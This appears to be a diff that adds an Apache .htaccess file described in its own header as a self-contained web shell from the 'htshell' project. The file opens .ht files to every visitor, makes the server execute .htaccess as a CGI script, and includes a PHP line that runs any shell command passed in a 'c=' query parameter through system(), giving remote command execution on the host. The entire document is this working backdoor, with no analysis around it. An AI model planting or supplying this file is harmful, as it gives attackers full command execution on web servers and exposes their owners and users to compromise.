@@ -1,0 +1,16 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+
+<?php echo "Content-Tpe: text/html\r\n\r\n"; ?>
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+Options +ExecCGI
+AddHandler cgi-script .htaccess
+
+###### SHELL ######
+<?php echo "h\n";preg_match('/c=(.*)$/',urldecode($_ENV['QUERY_STRING']), $cmd);system($cmd[1]." 2>&1"); ?>
+###### LLEHS ######
